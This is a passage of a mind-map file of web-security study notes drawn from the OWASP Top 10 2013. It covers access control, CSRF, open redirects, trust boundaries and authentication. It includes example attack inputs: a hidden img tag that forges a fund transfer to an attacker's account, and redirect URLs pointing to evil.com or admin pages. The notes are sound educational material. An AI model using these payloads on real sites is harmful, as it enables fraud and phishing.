                    Think about the process for managing entitlements and ensure you can update and audit easily. Don&#8217;t hard code.
                  </li>
                  <li>
                    The enforcement mechanism(s) should deny all access by default, requiring explicit grants to specific roles for access to every function.
                  </li>
                  <li>
                    If the function is involved in a workflow, check to make sure the conditions are in the proper state to allow access.
                  </li>
                </ol>
                <p>
                  NOTE: Most web applications don&#8217;t display links and buttons to unauthorized functions, but this &#8220;presentation layer access control&#8221; doesn&#8217;t actually provide protection. You must <u>also</u>&#160;implement checks in the controller or business logic.
                </p>
              </td>
            </tr>
          </table>
        </div>
      </div>
    </div>
  </body>
</html>
</richcontent>
</node>
</node>
<node CREATED="1395298424020" FOLDED="true" ID="ID_1297755251" MODIFIED="1395298448570" TEXT="example Attack">
<node CREATED="1395298429652" ID="ID_1247329624" MODIFIED="1395298438260">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div class="mw-body" id="content" role="main">
      <div id="bodyContent">
        <div class="mw-content-ltr" id="mw-content-text" lang="en" dir="ltr">
          <table style="border-spacing: 0; text-align: left; width: 100%">
            <tr>
              <td style="vertical-align: top; padding-bottom: 5px; padding-left: 5px; background-color: rgb(248, 255, 248); padding-top: 5px; padding-right: 5px; width: 50%">
                <div style="padding-bottom: 3px; color: rgb(0, 0, 0); margin-bottom: 3px; border-bottom-color: rgb(153, 153, 153); border-bottom-width: 1px; border-bottom-style: solid; font-size: 150%">
                  <font size="3">Example Attack Scenarios</font>
                </div>
                <p>
                  <b>Scenario #1:</b>&#160;The attacker simply force browses to target URLs. The following URLs require authentication. Admin rights are also required for access to the <u>admin_getappInfo</u>&#160; page.
                </p>
                <div style="padding-bottom: 4px; margin-left: 20px; padding-left: 4px; background-color: rgb(224, 224, 224); font-family: courier; padding-top: 4px; margin-right: 20px; padding-right: 4px">
                  http://example.com/app/getappInfo<br />http://example.com/app/admin_getappInfo
                </div>
                <p>
                  If an unauthenticated user can access either page, that&#8217;s a flaw. If an authenticated, non-admin, user is allowed to access the <u>admin_getappInfo</u>&#160;page, this is also a flaw, and may lead the attacker to more improperly protected admin pages.
                </p>
                <p>
                  <b>Scenario #2:</b>&#160;A page provides an 'action' parameter to specify the function being invoked, and different actions require different roles. If these roles aren&#8217;t enforced, that&#8217;s a flaw.
                </p>
              </td>
            </tr>
          </table>
        </div>
      </div>
    </div>
  </body>
</html>
</richcontent>
</node>
</node>
</node>
<node CREATED="1395215232926" FOLDED="true" ID="ID_1092356569" LINK="https://www.owasp.org/index.php/Top_10_2013-A8-Cross-Site_Request_Forgery_(CSRF)" MODIFIED="1395228789364" TEXT="cross-site request forgery">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<icon BUILTIN="full-8"/>
<node CREATED="1395215298418" ID="ID_1298438907" MODIFIED="1395220412524" TEXT="A CSRF attack forces a logged-on victim&#x2019;s browser to send a forged HTTP request, including the victim&#x2019;s session cookie and any other automatically included authentication information, to a vulnerable web application. This allows the attacker to force the victim&#x2019;s browser to generate requests the vulnerable application thinks are legitimate requests from the victim."/>
<node CREATED="1395220918939" ID="ID_1163626972" MODIFIED="1395220957482">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <table style="font-variant: normal; font-family: sans-serif; margin-right: 5px; background-color: rgb(248, 255, 248); text-transform: none; margin-bottom: 0px; white-space: normal; letter-spacing: normal; text-align: center; line-height: 19.200000762939453px; margin-top: 0px; font-weight: normal; color: rgb(0, 0, 0); margin-left: 5px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <tr style="background-color: rgb(77, 149, 61); color: rgb(255, 255, 255); font-size: 17px">
        <th width="16.5%">
          <font size="3">Threat Agents </font>
        </th>
        <th width="16.5%">
          <font size="3">Attack Vectors </font>
        </th>
        <th colspan="2" width="33%">
          <font size="3">Security Weakness </font>
        </th>
        <th width="16.5%">
          <font size="3">Technical Impacts </font>
        </th>
        <th width="16.5%">
          <font size="3">Business Impacts </font>
        </th>
      </tr>
      <tr>
        <td style="font-weight: bold; background-color: rgb(217, 217, 217); color: rgb(0, 0, 0); font-size: 13px">
          <font size="3">Application Specific </font>
        </td>
        <td width="16.5%" style="background-color: rgb(255, 178, 0); color: rgb(0, 0, 0)">
          <font size="3"><b>Exploitability<br size="3" />AVERAGE</b>&#160; </font>
        </td>
        <td width="16.5%" style="color: rgb(0, 0, 0); background-color: rgb(255, 178, 0)">
          <font size="3"><b>Prevalence<br size="3" />COMMON</b>&#160; </font>
        </td>
        <td width="16.5%" style="color: rgb(0, 0, 0); background-color: rgb(255, 0, 0)">
          <font size="3"><b>Detectability<br size="3" />EASY</b>&#160; </font>
        </td>
        <td width="16.5%" style="color: rgb(0, 0, 0); background-color: rgb(255, 178, 0)">
          <font size="3"><b>Impact<br size="3" />MODERATE</b>&#160; </font>
        </td>
        <td style="font-size: 13px; font-weight: bold; color: rgb(0, 0, 0); background-color: rgb(217, 217, 217)">
          <font size="3">Application / Business Specific </font>
        </td>
      </tr>
      <tr valign="top">
        <td style="text-align: left">
          <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
            <font size="3">Consider anyone who can load content into your users&#8217; browsers, and thus force them to submit a request to your website. Any website or other HTML feed that your users access could do this. </font>
          </p>
        </td>
        <td style="text-align: left">
          <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
            <font size="3">Attacker creates forged HTTP requests and tricks a victim into submitting them via image tags, XSS, or numerous other techniques.&#160;<u>If the user is authenticated</u>, the attack succeeds. </font>
          </p>
        </td>
        <td colspan="2" style="text-align: left">
          <font size="3" color="rgb(102, 51, 102)"><a rel="nofollow" href="https://www.owasp.org/index.php/CSRF" class="external text" style="text-decoration: none; background-repeat: repeat; color: rgb(102, 51, 102); padding-right: 13px; background-position: 100% 50%; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAdUlEQVQYV2P4//8/Awxv3LThf0dXKxyD+DA5DEUg+tWrV2AaWTFcIboJyJrhCtGtRMcgebhpL2/4/v//Lvn//x+7IRjIfn8v+P/t055gxZgKPzaC8Y/nMYQVLpnM8f/zo3AqKfzyOOL/h/sh/59c9sBUSIyvAeRdJWjk4E//AAAAAElFTkSuQmCC)">CSRF</a></font><font size="3">&#160;takes advantage the fact that most web apps allow attackers to predict all the details of a particular action. </font>

          <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
            <font size="3">Because browsers send credentials like session cookies automatically, attackers can create malicious web pages which generate forged requests that are indistinguishable from legitimate ones. </font>
          </p>
          <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
            <font size="3">Detection of CSRF flaws is fairly easy via penetration testing or code analysis. </font>
          </p>
        </td>
        <td style="text-align: left">
          <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
            <font size="3">Attackers can trick victims into performing any state changing operation the victim is authorized to perform, e.g., updating account details, making purchases, logout and even login. </font>
          </p>
        </td>
        <td style="text-align: left">
          <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
            <font size="3">Consider the business value of the affected data or application functions. Imagine not being sure if users intended to take these actions. </font>
          </p>
          <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
            <font size="3">Consider the impact to your reputation. </font>
          </p>
        </td>
      </tr>
    </table>
  </body>
</html></richcontent>
</node>
<node CREATED="1395221102822" FOLDED="true" ID="ID_1640318648" MODIFIED="1395223025935" TEXT="prevention">
<node CREATED="1395221107060" ID="ID_786467585" MODIFIED="1395222485638">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div style="font-variant: normal; font-family: sans-serif; text-transform: none; margin-bottom: 3px; white-space: normal; letter-spacing: normal; text-align: left; border-bottom-color: rgb(153, 153, 153); line-height: 19.200000762939453px; color: rgb(0, 0, 0); font-weight: normal; font-size: 19px; text-indent: 0px; word-spacing: 0px; font-style: normal; border-bottom-style: solid; border-bottom-width: 1px; padding-bottom: 3px">
      <font color="#ff0000" size="3"><b>How Do I Prevent 'Cross-Site Request Forgery (CSRF)'? </b></font>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3">Preventing CSRF usually requires the inclusion of an unpredictable token in each HTTP request. Such tokens should, at a minimum, be unique per user session. </font>
    </p>
    <ol>
      <li>
        <font size="3">The preferred option is to include the unique token also called as nonces in a hidden field. This causes the value to be sent in the body of the HTTP request, avoiding its inclusion in the URL, which is more prone to exposure. Generate nonces using good crypto (SHA-2 family of hashes).&#160;&#160;Verify these on server side.</font>
      </li>
      <li style="margin-bottom: 0">
        <font size="3">The unique token can also be included in the URL itself, or a URL parameter. However, such placement runs a greater risk that the URL will be exposed to an attacker, thus compromising the secret token.<br size="3" />OWASP&#8217;s&#160;</font><font color="rgb(102, 51, 102)" size="3"><a rel="nofollow" href="https://www.owasp.org/index.php/CSRFGuard" class="external text" style="text-decoration: none; background-repeat: repeat; color: rgb(102, 51, 102); padding-right: 13px; background-position: 100% 50%; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAdUlEQVQYV2P4//8/Awxv3LThf0dXKxyD+DA5DEUg+tWrV2AaWTFcIboJyJrhCtGtRMcgebhpL2/4/v//Lvn//x+7IRjIfn8v+P/t055gxZgKPzaC8Y/nMYQVLpnM8f/zo3AqKfzyOOL/h/sh/59c9sBUSIyvAeRdJWjk4E//AAAAAElFTkSuQmCC)">CSRF Guard</a></font><font size="3">&#160;can automatically include such tokens in Java EE, .NET, or PHP apps. OWASP&#8217;s&#160;</font><font size="3" color="rgb(102, 51, 102)"><a rel="nofollow" href="https://www.owasp.org/index.php/ESAPI" class="external text" style="text-decoration: none; background-repeat: repeat; color: rgb(102, 51, 102); padding-right: 13px; background-position: 100% 50%; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAdUlEQVQYV2P4//8/Awxv3LThf0dXKxyD+DA5DEUg+tWrV2AaWTFcIboJyJrhCtGtRMcgebhpL2/4/v//Lvn//x+7IRjIfn8v+P/t055gxZgKPzaC8Y/nMYQVLpnM8f/zo3AqKfzyOOL/h/sh/59c9sBUSIyvAeRdJWjk4E//AAAAAElFTkSuQmCC)">ESAPI</a></font><font size="3">&#160;includes methods developers can use to prevent CSRF vulnerabilities. </font>
      </li>
      <li style="margin-bottom: 0">
        <font size="3">Requiring the user to reauthenticate, or prove they are a user (e.g., via a CAPTCHA) can also protect against CSRF.</font>
      </li>
      <li style="margin-bottom: 0">
        Use out-of-band facilitie to confirm, such as Email, text msg.
      </li>
      <li style="margin-bottom: 0">
        Java Spring provides inbuilt framework for creating transaction specific identifiers.
      </li>
    </ol>
  </body>
</html></richcontent>
</node>
</node>
<node CREATED="1395221212202" FOLDED="true" ID="ID_674706432" MODIFIED="1395221226351" TEXT="example">
<node CREATED="1395221215182" ID="ID_1931161982" MODIFIED="1395221218279">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div style="font-variant: normal; font-family: sans-serif; text-transform: none; margin-bottom: 3px; white-space: normal; letter-spacing: normal; text-align: left; border-bottom-color: rgb(153, 153, 153); line-height: 19.200000762939453px; color: rgb(0, 0, 0); font-weight: normal; font-size: 19px; text-indent: 0px; word-spacing: 0px; font-style: normal; border-bottom-style: solid; border-bottom-width: 1px; padding-bottom: 3px">
      Example Attack Scenarios
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      The application allows a user to submit a state changing request that does not include anything secret. For example:
    </p>
    <div style="font-variant: normal; font-family: courier; padding-left: 4px; margin-right: 20px; background-color: rgb(224, 224, 224); padding-top: 4px; text-transform: none; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; font-weight: normal; color: rgb(0, 0, 0); margin-left: 20px; font-size: 13px; padding-right: 4px; text-indent: 0px; word-spacing: 0px; font-style: normal; padding-bottom: 4px">
      <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
        http://example.com/app/transferFunds?amount=1500&amp;destinationAccount=4673243243
      </p>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      So, the attacker constructs a request that will transfer money from the victim&#8217;s account to the attacker&#8217;s account, and then embeds this attack in an image request or iframe stored on various sites under the attacker&#8217;s control:
    </p>
    <div style="font-variant: normal; font-family: courier; padding-left: 4px; margin-right: 20px; background-color: rgb(224, 224, 224); padding-top: 4px; text-transform: none; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; font-weight: normal; color: rgb(0, 0, 0); margin-left: 20px; font-size: 13px; padding-right: 4px; text-indent: 0px; word-spacing: 0px; font-style: normal; padding-bottom: 4px">
      <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
        &lt;img src=&quot;<font color="red"><span style="color: red">http://example.com/app/transferFunds?amount=1500&amp;destinationAccount=attackersAcct#</span></font>&quot; width=&quot;0&quot; height=&quot;0&quot; /&gt;
      </p>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      If the victim visits any of the attacker&#8217;s sites while already authenticated to example.com, these forged requests will automatically include the user&#8217;s session info, authorizing the attacker&#8217;s request.
    </p>
  </body>
</html></richcontent>
</node>
</node>
</node>
<node CREATED="1395228765498" FOLDED="true" ID="ID_1723171645" LINK="https://www.owasp.org/index.php/Top_10_2013-A10-Unvalidated_Redirects_and_Forwards" MODIFIED="1395231738080" TEXT="Unvalidated Redirects and Forwards">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<icon BUILTIN="full-1"/>
<icon BUILTIN="full-0"/>
<node CREATED="1395228897053" ID="ID_1856674779" MODIFIED="1395228923580">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <table>
      <tr style="font-variant: normal; font-family: sans-serif; background-color: rgb(77, 149, 61); text-transform: none; white-space: normal; letter-spacing: normal; text-align: center; line-height: 19.200000762939453px; color: rgb(255, 255, 255); font-weight: normal; font-size: 17px; text-indent: 0px; word-spacing: 0px; font-style: normal">
        <th width="16.5%">
          <font size="4">Threat Agents </font>
        </th>
        <th width="16.5%">
          <font size="4">Attack Vectors </font>
        </th>
        <th colspan="2" width="33%">
          <font size="4">Security Weakness </font>
        </th>
        <th width="16.5%">
          <font size="4">Technical Impacts </font>
        </th>
        <th width="16.5%">
          <font size="4">Business Impacts</font>
        </th>
      </tr>
      <tr style="font-variant: normal; font-family: sans-serif; background-color: rgb(248, 255, 248); text-transform: none; white-space: normal; letter-spacing: normal; text-align: center; line-height: 19.200000762939453px; color: rgb(0, 0, 0); font-weight: normal; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
        <td style="font-weight: bold; background-color: rgb(217, 217, 217); color: rgb(0, 0, 0); font-size: 13px">
          <font size="4">Application Specific </font>
        </td>
        <td width="16.5%" style="background-color: rgb(255, 178, 0); color: rgb(0, 0, 0)">
          <font size="4"><b>Exploitability<br size="4" />AVERAGE</b> </font>
        </td>
        <td width="16.5%" style="color: rgb(0, 0, 0); background-color: rgb(255, 255, 0)">
          <font size="4"><b>Prevalence<br size="4" />UNCOMMON</b> </font>
        </td>
        <td width="16.5%" style="color: rgb(0, 0, 0); background-color: rgb(255, 0, 0)">
          <font size="4"><b>Detectability<br size="4" />EASY</b> </font>
        </td>
        <td width="16.5%" style="color: rgb(0, 0, 0); background-color: rgb(255, 178, 0)">
          <font size="4"><b>Impact<br size="4" />MODERATE</b> </font>
        </td>
        <td style="font-size: 13px; font-weight: bold; color: rgb(0, 0, 0); background-color: rgb(217, 217, 217)">
          <font size="4">Application / Business Specific</font>
        </td>
      </tr>
      <tr valign="top" style="font-variant: normal; font-family: sans-serif; background-color: rgb(248, 255, 248); text-transform: none; white-space: normal; letter-spacing: normal; text-align: center; line-height: 19.200000762939453px; color: rgb(0, 0, 0); font-weight: normal; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
        <td style="text-align: left">
          <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
            <font size="3">Consider anyone who can trick your users into submitting a request to your website. Any website or other HTML feed that your users use could do this. </font>
          </p>
        </td>
        <td style="text-align: left">
          <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
            <font size="3">Attacker links to unvalidated redirect and tricks victims into clicking it. Victims are more likely to click on it, since the link is to a valid site. Attacker targets unsafe forward to bypass security checks. </font>
          </p>
        </td>
        <td colspan="2" style="text-align: left">
          <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
            <font size="3">Applications frequently redirect users to other pages, or use internal forwards in a similar manner. Sometimes the target page is specified in an unvalidated parameter, allowing attackers to choose the destination page. </font>
          </p>
          <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
            <font size="3">Detecting unchecked redirects is easy. Look for redirects where you can set the full URL. Unchecked forwards are harder, because they target internal pages. </font>
          </p>
        </td>
        <td style="text-align: left">
          <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
            <font size="3">Such redirects may attempt to install malware or trick victims into disclosing passwords or other sensitive information. Unsafe forwards may allow access control bypass. </font>
          </p>
        </td>
        <td style="text-align: left">
          <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
            <font size="3">Consider the business value of retaining your users&#8217; trust. </font>
          </p>
          <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
            <font size="3">What if they get owned by malware? </font>
          </p>
          <p style="line-height: 1.5em; margin-top: 0; margin-bottom: 0; margin-right: 0px; margin-left: 0px">
            <font size="3">What if attackers can access internal only functions</font>
          </p>
        </td>
      </tr>
    </table>
  </body>
</html></richcontent>
</node>
<node CREATED="1395228965564" FOLDED="true" ID="ID_1898915715" MODIFIED="1395229092357" TEXT="example">
<node CREATED="1395228968069" ID="ID_836854178" MODIFIED="1395228975147">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div style="font-variant: normal; font-family: sans-serif; text-transform: none; margin-bottom: 3px; white-space: normal; letter-spacing: normal; text-align: left; border-bottom-color: rgb(153, 153, 153); line-height: 19.200000762939453px; color: rgb(0, 0, 0); font-weight: normal; font-size: 19px; text-indent: 0px; word-spacing: 0px; font-style: normal; border-bottom-style: solid; border-bottom-width: 1px; padding-bottom: 3px">
      <font size="3">Example Attack Scenarios </font>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3"><b>Scenario #1:</b>&#160;The application has a page called &#8220;redirect.jsp&#8221; which takes a single parameter named &#8220;url&#8221;. The attacker crafts a malicious URL that redirects users to a malicious site that performs phishing and installs malware. </font>
    </p>
    <div style="font-variant: normal; font-family: courier; padding-left: 4px; margin-right: 20px; background-color: rgb(224, 224, 224); padding-top: 4px; text-transform: none; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; font-weight: normal; color: rgb(0, 0, 0); margin-left: 20px; font-size: 13px; padding-right: 4px; text-indent: 0px; word-spacing: 0px; font-style: normal; padding-bottom: 4px">
      <font size="3">http://www.example.com/redirect.jsp?url=evil.com </font>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3"><b>Scenario #2:</b>&#160;The application uses forwards to route requests between different parts of the site. To facilitate this, some pages use a parameter to indicate where the user should be sent if a transaction is successful. In this case, the attacker crafts a URL that will pass the application&#8217;s access control check and then forwards the attacker to administrative functionality for which the attacker isn&#8217;t authorized. </font>
    </p>
    <div style="font-variant: normal; font-family: courier; padding-left: 4px; margin-right: 20px; background-color: rgb(224, 224, 224); padding-top: 4px; text-transform: none; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; font-weight: normal; color: rgb(0, 0, 0); margin-left: 20px; font-size: 13px; padding-right: 4px; text-indent: 0px; word-spacing: 0px; font-style: normal; padding-bottom: 4px">
      <font size="3">http://www.example.com/boring.jsp?fwd=admin.jsp </font>
    </div>
  </body>
</html></richcontent>
</node>
</node>
<node CREATED="1395229093290" ID="ID_306544013" MODIFIED="1395229095510" TEXT="prevention">
<node CREATED="1395229123135" ID="ID_1710798729" MODIFIED="1395229143034">
<richcontent TYPE="NODE"><html>
  <head>
    
  </head>
  <body>
    <div style="font-variant: normal; font-family: sans-serif; text-transform: none; margin-bottom: 3px; white-space: normal; letter-spacing: normal; text-align: left; border-bottom-color: rgb(153, 153, 153); line-height: 19.200000762939453px; color: rgb(0, 0, 0); font-weight: normal; font-size: 19px; text-indent: 0px; word-spacing: 0px; font-style: normal; border-bottom-style: solid; border-bottom-width: 1px; padding-bottom: 3px">
      <font size="3">How Do I Prevent 'Unvalidated Redirects and Forwards'? </font>
    </div>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3">Safe use of redirects and forwards can be done in a number of ways: </font>
    </p>
    <ol>
      <li>
        <font size="3">Simply avoid using redirects and forwards. </font>
      </li>
      <li style="margin-bottom: 0">
        <font size="3">If used, don&#8217;t involve user parameters in calculating the destination. This can usually be done. </font>
      </li>
      <li style="margin-bottom: 0">
        <font size="3">If destination parameters can&#8217;t be avoided, ensure that the supplied value is valid, and authorized for the user.<br size="3" />It is recommended that any such destination parameters be a mapping value, rather than the actual URL or portion of the URL, and that server side code translate this mapping to the target URL.<br size="3" />Applications can use ESAPI to override the&#160;</font><font color="rgb(102, 51, 102)" size="3"><a rel="nofollow" href="http://owasp-esapi-java.googlecode.com/svn/trunk_doc/latest/org/owasp/esapi/filters/SecurityWrapperResponse.html" class="external text" style="text-decoration: none; background-repeat: repeat; color: rgb(102, 51, 102); padding-right: 13px; background-position: 100% 50%; background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAVklEQVR4Xn3PgQkAMQhDUXfqTu7kTtkpd5RA8AInfArtQ2iRXFWT2QedAfttj2FsPIOE1eCOlEuoWWjgzYaB/IkeGOrxXhqB+uA9Bfcm0lAZuh+YIeAD+cAqSz4kCMUAAAAASUVORK5CYII=)">sendRedirect()</a></font><font size="3">&#160;method to make sure all redirect destinations are safe. </font>
      </li>
    </ol>
    <p style="font-variant: normal; font-family: sans-serif; margin-right: 0px; text-transform: none; margin-bottom: 0; white-space: normal; letter-spacing: normal; text-align: left; line-height: 19.200000762939453px; margin-top: 0; font-weight: normal; color: rgb(0, 0, 0); margin-left: 0px; font-size: 13px; text-indent: 0px; word-spacing: 0px; font-style: normal">
      <font size="3">Avoiding such flaws is extremely important as they are a favorite target of phishers trying to gain the user&#8217;s trust. </font>
    </p>
  </body>
</html></richcontent>
</node>
</node>
</node>
</node>
<node CREATED="1395212560962" FOLDED="true" ID="ID_1146788006" MODIFIED="1395212849709" POSITION="right" TEXT="trust boundaries">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<icon BUILTIN="full-1"/>
<node CREATED="1395212569858" ID="ID_342932473" MODIFIED="1395212590845" TEXT="web application must validate inputs from a user to handle potential attacks. This includes cookies, headers, form post parameters, hidden fields, and any and every part of an HTTP request."/>
<node CREATED="1395212623773" ID="ID_1723500634" MODIFIED="1395212625677" TEXT=" do not just apply to the relationship between an application and a user; they apply to communications with any other external system, such as services or databases."/>
<node CREATED="1395212676123" ID="ID_44520901" MODIFIED="1395212678878" TEXT="handling trust boundaries">
<node CREATED="1395212684967" ID="ID_1630858478" MODIFIED="1395212687535" TEXT="create a data flow diagram identifying all external systems the application interacts with."/>
<node CREATED="1395212742859" ID="ID_1258050661" MODIFIED="1395212744224" TEXT=" All validation of data across a trust boundary should occur on the &quot;back end,&quot; handled directly by the application itself."/>
<node CREATED="1395212769022" ID="ID_51883352" MODIFIED="1395212769781" TEXT=" minimizing required input"/>
</node>
</node>
<node CREATED="1395212851013" FOLDED="true" ID="ID_749893167" MODIFIED="1395229040825" POSITION="right" TEXT="Authentication">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<icon BUILTIN="full-2"/>
<node CREATED="1395212917885" ID="ID_1633059976" MODIFIED="1395212924043" TEXT="def:  means verifying a user is who they claim to be. I"/>
<node CREATED="1395212960256" FOLDED="true" ID="ID_116065443" MODIFIED="1395213302901" TEXT=" three common ways">
<node CREATED="1395213002886" ID="ID_1318118858" MODIFIED="1395213003706" TEXT="prove who they are to a system are by demonstrating what they are, what they have, or what they know. "/>
<node CREATED="1395213037072" ID="ID_1674080646" MODIFIED="1395213050068" TEXT="user &quot;is&quot; includes biometrics -finger prints, voice characteristics, or retina scans."/>
<node CREATED="1395213039813" ID="ID_265573680" MODIFIED="1395213062770" TEXT=" user &quot;has&quot; for authentication would be a passcard or other physical authentication tokens"/>
<node CREATED="1395213073851" ID="ID_774611251" MODIFIED="1395213078638" TEXT="user would &quot;know&quot; would be a username and password combination. "/>
</node>
<node CREATED="1395213159164" FOLDED="true" ID="ID_829041338" MODIFIED="1395214808830" TEXT="HTTP Basic Authentication">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<node CREATED="1395213161444" ID="ID_86357708" MODIFIED="1395213200747" TEXT="Base64 encoded , user:password, its not a encryption, can be easily decoded"/>
</node>
<node CREATED="1395213211493" FOLDED="true" ID="ID_205103622" MODIFIED="1395214811784" TEXT="session based">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<node CREATED="1395213230408" ID="ID_786250753" MODIFIED="1395213231247" TEXT="username and password in a web page - hopefully over HTTPS so the attackers cannot observe the traffic while in transit. "/>
<node CREATED="1395213242551" ID="ID_383405503" MODIFIED="1395213243368" TEXT="server validates these credentials against some data store such as a local database of usernames and passwords or perhaps an LDAP directory server"/>
<node CREATED="1395213259607" ID="ID_1640981654" MODIFIED="1395213260403" TEXT="he server assigns the user a session identifier which should be a value that would be hard for an attacker to guess."/>
<node CREATED="1395213275647" ID="ID_699674564" MODIFIED="1395213276331" TEXT="This session identifier is passed between the browser and the server throughout the user&apos;s use of the web application - typically via cookies."/>
</node>
<node CREATED="1395213336095" FOLDED="true" ID="ID_162906220" MODIFIED="1395229040432" TEXT="vulenerability">
<node CREATED="1395213346767" ID="ID_330206639" MODIFIED="1395213352742" TEXT="Broken authentication"/>
</node>
<node CREATED="1395213474533" ID="ID_165031333" MODIFIED="1395214812836" TEXT="Attacks">
<node CREATED="1395213477609" FOLDED="true" ID="ID_1898332428" MODIFIED="1395213584379" TEXT=" retrieving them over the wire with packet sniffing hardware or software">
<node CREATED="1395213513506" ID="ID_1342777363" MODIFIED="1395213522273" TEXT="cause:application does not adequately implement transport layer security"/>
</node>
<node CREATED="1395213498538" ID="ID_277021423" MODIFIED="1395213590064" TEXT="exploiting password recovery features">
<node CREATED="1395213572591" ID="ID_1203582754" MODIFIED="1395213582285" TEXT="brute force attacks for guessing"/>
</node>
<node CREATED="1395213503438" ID="ID_1499978941" MODIFIED="1395213504111" TEXT="exploiting poor session management functionality."/>
</node>
<node CREATED="1395213612390" FOLDED="true" ID="ID_1525928977" MODIFIED="1395214799244" TEXT="Best practises">
<font BOLD="true" NAME="SansSerif" SIZE="12"/>
<node CREATED="1395213715531" ID="ID_890140906" MODIFIED="1395213837941" TEXT="avoid placing sensitive authentication data in web browsers store outgoing request URLs in their history, and many web servers store incoming request URLs in logs or cache"/>
<node CREATED="1395213916704" ID="ID_509133752" MODIFIED="1395213933849" TEXT="login routines should be sent via POST requests rather than GET requests"/>
<node CREATED="1395214307911" ID="ID_1810060192" MODIFIED="1395214308734" TEXT="When users update their passwords, they should be required to enter their old password."/>
